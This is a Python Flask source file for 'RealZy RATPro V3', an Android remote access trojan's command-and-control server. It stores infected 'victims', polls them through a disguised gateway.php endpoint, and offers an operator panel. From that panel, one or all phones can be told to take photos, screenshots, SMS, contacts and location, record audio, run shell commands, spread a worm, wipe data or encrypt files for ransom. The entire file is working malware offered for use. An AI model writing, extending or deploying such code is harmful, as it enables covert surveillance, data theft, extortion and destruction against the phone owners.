#!/usr/bin/env python3
"""
RealZy RATPro ULTIMATE V3 — Complete Server
Run: python3 ultimate_server.py
"""

from flask import Flask, request, render_template_string
import sqlite3, json, os, base64
from datetime import datetime

app = Flask(__name__)
DB = 'ratpro.db'
SCREENSHOT_DIR = 'screenshots'

if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, ip TEXT, model TEXT, android TEXT,
        first_seen TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, command TEXT, status TEXT DEFAULT 'pending',
        timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, data TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Embedded Panel HTML (sama kayak yang di panel.py)
PANEL = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RealZy RATPro ☠️</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #08080f; color: #00ff41; font-family: 'Courier New', monospace; padding: 10px; font-size: 13px; }
        .header { text-align: center; padding: 20px; border-bottom: 2px solid #ff0040; margin-bottom: 15px; }
        .header h1 { color: #ff0040; text-shadow: 0 0 15px #ff0040; }
        .card { background: #0f0f1a; border: 1px solid #00ff41; border-radius: 8px; padding: 12px; margin-bottom: 12px; }
        .card h3 { color: #ff0040; margin-bottom: 10px; }
        select, input, button { width: 100%; padding: 8px; margin: 4px 0; background: #000; color: #00ff41; border: 1px solid #00ff41; border-radius: 5px; font-family: 'Courier New', monospace; }
        button { background: #001a00; font-weight: bold; cursor: pointer; }
        button.danger { background: #330000; border-color: #ff0040; color: #ff0040; }
        button:hover { background: #00ff41; color: #000; }
        button.danger:hover { background: #ff0040; color: #000; }
        table { width: 100%; border-collapse: collapse; font-size: 0.75em; }
        th, td { border: 1px solid #00ff41; padding: 6px; }
        th { background: #001a00; }
        #logOutput { max-height: 200px; overflow-y: auto; background: #000; padding: 8px; font-size: 0.7em; }
    </style>
</head>
<body>
    <div class="header">
        <h1>☠️ REALZY RATPRO V3</h1>
        <p>Devices: {{ stats.total }} | Online: {{ stats.online }}</p>
    </div>

    <div class="card" style="border-color:#ff0040;">
        <h3>⚡ QUICK — ALL DEVICES</h3>
        <button onclick="globalCmd('lock_screen')" class="danger">🔒 Lock All</button>
        <button onclick="globalCmd('screenshot')">📸 Capture All</button>
        <button onclick="globalCmd('spread_worm')" class="danger">🐛 Spread Worm</button>
        <button onclick="globalCmd('get_contacts')">👥 All Contacts</button>
    </div>

    <div class="card">
        <h3>📱 DEVICES</h3>
        <table>
            <tr><th>ID</th><th>Model</th><th>Actions</th></tr>
            {% for v in victims %}
            <tr>
                <td>{{ v.id[:10] }}...</td>
                <td>{{ v.model }}</td>
                <td>
                    <select id="cmd_{{ v.id }}" style="width:130px;display:inline;">
                        <option value="lock_screen">Lock Screen</option>
                        <option value="lock_camera">Lock Camera</option>
                        <option value="cam_snap">Take Photo</option>
                        <option value="screenshot">Screenshot</option>
                        <option value="get_sms">Get SMS</option>
                        <option value="get_contacts">Get Contacts</option>
                        <option value="get_location">Get Location</option>
                        <option value="record_audio">Record Audio</option>
                        <option value="shell">Shell Command</option>
                        <option value="spread_worm">Spread Worm</option>
                        <option value="wipe_data">Wipe Data</option>
                        <option value="encrypt_files">Encrypt Files</option>
                    </select>
                    <button onclick="sendCmd('{{ v.id }}')">▶</button>
                </td>
            </tr>
            {% endfor %}
        </table>
    </div>

    <div class="card">
        <h3>📝 LOGS</h3>
        <div id="logOutput">Waiting...</div>
        <button onclick="document.getElementById('logOutput').innerHTML=''">Clear</button>
    </div>

    <script>
        function sendCmd(id) {
            let action = document.getElementById('cmd_'+id).value;
            let data = 'device_id='+id+'&action='+action;
            if(action==='shell'){ let c=prompt('Shell command:'); if(!c)return; data+='&shell_cmd='+encodeURIComponent(c); }
            fetch('/send',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:data})
            .then(r=>r.text()).then(t=>addLog('['+id.slice(0,8)+'] '+action+' ✓'));
        }
        function globalCmd(action) {
            if(!confirm('Execute '+action+' on ALL?'))return;
            fetch('/send',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'device_id=ALL&action='+action})
            .then(r=>r.text()).then(t=>addLog('[GLOBAL] '+action+' ✓'));
        }
        function addLog(m){ document.getElementById('logOutput').innerHTML='['+new Date().toLocaleTimeString()+'] '+m+'<br>'+document.getElementById('logOutput').innerHTML; }
        setInterval(()=>location.reload(),30000);
    </script>
</body>
</html>
"""

@app.route('/')
@app.route('/panel')
def panel():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY last_seen DESC')
    victims = []
    for row in c.fetchall():
        try:
            last = datetime.fromisoformat(row[5]) if row[5] else datetime.now()
            online = (datetime.now() - last).seconds < 120
        except: online = False
        victims.append({'id':row[0], 'model':row[2], 'online':online})
    conn.close()
    stats = {'total':len(victims), 'online':sum(1 for v in victims if v['online'])}
    return render_template_string(PANEL, victims=victims, stats=stats)

@app.route('/api/gateway.php', methods=['GET'])
def poll():
    device_id = request.args.get('id','unknown')
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("UPDATE victims SET last_seen=? WHERE id=?", (datetime.now().isoformat(), device_id))
    c.execute("SELECT id,command FROM commands WHERE device_id=? AND status='pending' ORDER BY id LIMIT 1", (device_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE commands SET status='sent' WHERE id=?", (row[0],))
        conn.commit(); conn.close()
        return row[1]
    conn.commit(); conn.close()
    return '{"action":"ping"}'

@app.route('/api/gateway.php', methods=['POST'])
def receive():
    device_id = request.form.get('id','unknown')
    data = request.form.get('data','')
    try:
        j = json.loads(data)
        if 'model' in j:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO victims VALUES (?,?,?,?,?,?)",
                     (device_id, request.remote_addr, j.get('model','?'), j.get('android','?'),
                      datetime.now().isoformat(), datetime.now().isoformat()))
            conn.commit(); conn.close()
            return 'OK'
        if 'filename' in j and 'data' in j:
            img = base64.b64decode(j['data'])
            with open(os.path.join(SCREENSHOT_DIR, f"{device_id}.png"), 'wb') as f: f.write(img)
            return 'OK'
    except: pass
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("INSERT INTO logs VALUES (NULL,?,?,?)", (device_id, data, datetime.now().isoformat()))
    conn.commit(); conn.close()
    return 'OK'

@app.route('/screenshot/<device_id>')
def screenshot(device_id):
    fp = os.path.join(SCREENSHOT_DIR, f"{device_id}.png")
    if os.path.exists(fp):
        with open(fp,'rb') as f: return f.read(), 200, {'Content-Type':'image/png'}
    return '', 404

@app.route('/send', methods=['POST'])
def send():
    device_id = request.form.get('device_id','')
    action = request.form.get('action','')
    cmd = {"action":action}
    if action=='shell': cmd['command']=request.form.get('shell_cmd','')
    elif action=='record_audio': cmd['duration']=30
    elif action=='encrypt_files': cmd['path']='/sdcard'; cmd['password']='ransom'
    command = json.dumps(cmd)
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    if device_id=='ALL':
        c.execute('SELECT id FROM victims')
        for row in c.fetchall():
            c.execute("INSERT INTO commands VALUES (NULL,?,?,'pending',?)", (row[0], command, datetime.now().isoformat()))
    else:
        c.execute("INSERT INTO commands VALUES (NULL,?,?,'pending',?)", (device_id, command, datetime.now().isoformat()))
    conn.commit(); conn.close()
    return 'OK'

if __name__ == '__main__':
    print("""\n    ╔══════════════════════════════════════╗
    ║   RealZy RATPro ULTIMATE V3 ☠️        ║
    ║   Panel: http://localhost:8080/panel   ║
    ╚══════════════════════════════════════╝\n""")
    app.run(host='0.0.0.0', port=8080, debug=False)